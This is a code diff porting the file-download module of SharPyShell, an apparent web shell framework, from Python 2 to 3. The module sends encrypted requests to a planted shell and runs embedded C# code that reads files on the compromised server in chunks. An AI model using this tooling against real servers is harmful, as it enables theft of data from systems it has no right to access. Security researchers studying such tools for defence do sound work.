@@ -2,6 +2,7 @@ from core.Module import Module, ModuleException
 from core import config
 import ntpath
 import traceback
+from time import sleep
 
 
 class DownloadModuleException(ModuleException):
@@ -23,7 +24,7 @@ class Download(Module):
         Positional arguments:
             remote_input_path               The file path you want to download from the remote server
             local_output_path               The path where the file will be saved on your local machine
-                                            Default: 'output/' directory of Sharpyshell directory
+                                            Default: 'output' directory of Sharpyshell directory
             chunk_size                      The maximum limit of a chunk to be transferred over the network
                                             Default: 102400
         
@@ -36,7 +37,7 @@ class Download(Module):
                 #download C:\windows\system32\cmd.exe /home/user/cmd.exe 1024
     """
 
-    _runtime_code = ur"""
+    _runtime_code = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
             public class SharPyShell{                    
                 public byte[] Download(string arg){
@@ -56,7 +57,7 @@ class Download(Module):
             }
     """
 
-    __runtime_code_split_file = ur"""
+    __runtime_code_split_file = r"""
                 using System;using System.IO;using System.Diagnostics;using System.Text;
                 public class SharPyShell{                    
                     public byte[] Download(string arg, int chunk, int offset){
@@ -79,7 +80,7 @@ class Download(Module):
                 }
         """
 
-    __runtime_code_get_file_size = ur"""
+    __runtime_code_get_file_size = r"""
             using System;using System.IO;using System.Diagnostics;using System.Text;
             public class SharPyShell{                    
                 string GetFileSize(string path){
@@ -115,8 +116,14 @@ class Download(Module):
             file_open_mode = 'ab'
         else:
             file_open_mode = 'wb'
-        with open(output_path, file_open_mode) as outfile:
-            outfile.write(file_content)
+        try:
+            with open(output_path, file_open_mode) as outfile:
+                outfile.write(file_content)
+        # tune for Windows race condition on file access when the chunk_size is very small, weird...
+        except PermissionError:
+            sleep(1)
+            with open(output_path, file_open_mode) as outfile:
+                outfile.write(file_content)
         output = "File Downloaded correctly to " + output_path
         return output
 
@@ -163,11 +170,11 @@ class Download(Module):
                 encrypted_request = self._encrypt_request(req)
                 encrypted_response = self._post_request(encrypted_request)
                 decrypted_response = self._decrypt_response(encrypted_response)
-                file_content = self._parse_response(decrypted_response)
+                file_content = decrypted_response
                 if len(requests) > 1:
                     parsed_response = self.__write_local_file(file_content, download_output_path, split=True)
-                    print 'Chunk ' + str(i + 1) + ' --> ' + str(chunk_size * i) + ' - ' +\
-                          str(chunk_size * i + chunk_size) + ' bytes written correctly to ' + download_output_path
+                    print ('Chunk ' + str(i + 1) + ' --> ' + str(chunk_size * i) + ' - ' +\
+                          str(chunk_size * i + chunk_size) + ' bytes written correctly to ' + download_output_path)
                 else:
                     parsed_response = self.__write_local_file(file_content, download_output_path)
         except ModuleException as module_exc:
